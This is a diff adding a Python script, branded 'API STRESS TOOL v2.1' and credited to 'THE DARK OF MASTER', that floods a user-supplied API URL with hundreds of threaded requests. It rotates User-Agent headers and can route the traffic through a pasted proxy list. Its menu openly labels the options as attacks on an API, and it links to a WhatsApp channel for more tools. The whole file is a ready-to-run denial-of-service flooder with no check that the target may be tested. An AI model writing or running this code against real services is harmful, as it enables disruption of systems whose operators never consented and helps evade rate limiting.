@@ -1,0 +1,136 @@
+import requests
+import threading
+import random
+import time
+import os
+import sys
+import webbrowser
+
+# 🎨 Terminal Colors
+GREEN = '\033[92m'
+RED = '\033[91m'
+CYAN = '\033[96m'
+WHITE = '\033[97m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
+
+# ▓ User-Agents
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (X11; Linux x86_64)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
+    "Mozilla/5.0 (Linux; Android 10; SM-G973F)"
+]
+
+# ۞ Settings
+TOTAL_REQUESTS = 500
+DELAY_BETWEEN_REQUESTS = 0.01
+THREAD_COUNT = 20
+
+# 𖠅 Stats
+success_count = 0
+failed_count = 0
+lock = threading.Lock()
+
+def clear():
+    os.system("cls" if os.name == "nt" else "clear")
+
+def send_request(i, api_url, proxies=None):
+    global success_count, failed_count
+    try:
+        headers = {"User-Agent": random.choice(USER_AGENTS)}
+        proxy = None
+        if proxies:
+            selected = random.choice(proxies)
+            proxy = {"http": selected, "https": selected}
+        res = requests.get(api_url, headers=headers, proxies=proxy, timeout=10)
+        with lock:
+            success_count += 1
+            print(f"{GREEN}[{i}] ✔ {res.status_code}{RESET}")
+    except Exception as e:
+        with lock:
+            failed_count += 1
+            print(f"{RED}[{i}] ✘ {e}{RESET}")
+
+def run_stress_test(api_url, use_proxies=False, dynamic_proxies=None):
+    global success_count, failed_count
+    success_count = 0
+    failed_count = 0
+    print(f"\n{CYAN}♋︎ Sending {TOTAL_REQUESTS} requests to API: {api_url}{RESET}\n")
+    threads = []
+    for i in range(1, TOTAL_REQUESTS + 1):
+        t = threading.Thread(target=send_request, args=(i, api_url, dynamic_proxies if use_proxies else None))
+        t.start()
+        threads.append(t)
+
+        if i % THREAD_COUNT == 0:
+            for th in threads:
+                th.join()
+            threads = []
+            time.sleep(DELAY_BETWEEN_REQUESTS)
+
+    for t in threads:
+        t.join()
+
+    print(f"\n{GREEN}✔ Done!{RESET}")
+    print(f"{WHITE}✔ Success: {success_count} | ✘ Failed: {failed_count}{RESET}")
+
+def menu():
+    clear()
+    print(f"{GREEN}{BOLD}+{'='*35}+")
+    print(f"|{' API STRESS TOOL v2.1 ':^35}|")
+    print(f"+{'='*35}+{RESET}")
+    print(f"{RED}╼ DEVELOPED BY THE DARK OF MASTER☠︎{RESET}\n")
+    print(f"{CYAN}> ENTER 1 TO ATTACK ON API")
+    print("> ENTER 2 TO ATTACK API WITH PROXY")
+    print("> ENTER 3 TO GET MORE TOOLS & JOIN US")
+    print("> ENTER 4 TO EXIT TOOL{RESET}")
+    choice = input(f"\n{WHITE}ENTER OPTION (1/2/3/4): {RESET}")
+    return choice
+
+if __name__ == "__main__":
+    while True:
+        user_choice = menu()
+        if user_choice == "1":
+            api_url = input(f"\n{WHITE}> 🔗 ENTER API URL: {RESET}").strip()
+            run_stress_test(api_url, use_proxies=False)
+            input(f"\n{CYAN}> ♲︎ Press Enter to return to menu...{RESET}")
+        elif user_choice == "2":
+            api_url = input(f"\n{WHITE}> 🔗 ENTER API URL: {RESET}").strip()
+            print(f"{WHITE}> ♲︎ ENTER YOUR PROXY LIST (one per line)")
+            print("> ✍ PAST API LIST AND PRESS ENTER 2 TIMES")
+            proxy_lines = []
+            while True:
+                line = input()
+                if not line.strip():
+                    break
+                proxy_lines.append(line.strip())
+            dynamic_proxies = [proxy for proxy in proxy_lines if proxy]
+            if not dynamic_proxies:
+                print(f"{RED}✘ No valid proxies entered. Returning to menu.{RESET}")
+            else:
+                run_stress_test(api_url, use_proxies=True, dynamic_proxies=dynamic_proxies)
+            input(f"\n{CYAN}⌧ Press Enter to return to menu...{RESET}")
+        elif user_choice == "3":
+            print(f"{CYAN}\nLoadingl...{RESET}")
+            time.sleep(1)
+            url = "https://whatsapp.com/channel/0029VbAsHR3EquiQSTbSZw2z"
+            try:
+                if sys.platform.startswith("win"):
+                    os.system(f"start {url}")
+                elif sys.platform.startswith("linux"):
+                    os.system(f"xdg-open {url}")
+                elif sys.platform.startswith("darwin"):
+                    os.system(f"open {url}")
+                else:
+                    webbrowser.open(url)
+            except Exception as e:
+                print(f"{RED}✘ Failed to open browser: {e}{RESET}")
+            input(f"{WHITE}⌧ Press Enter to return to menu...{RESET}")
+        elif user_choice == "4":
+            print(f"{GREEN}☘ Exiting... Thank you for using the tool!{RESET}")
+            sys.exit()
+        else:
+            print(f"{RED}✘ Invalid option! Please select 1, 2, 3, or 4.{RESET}")
+            time.sleep(1)
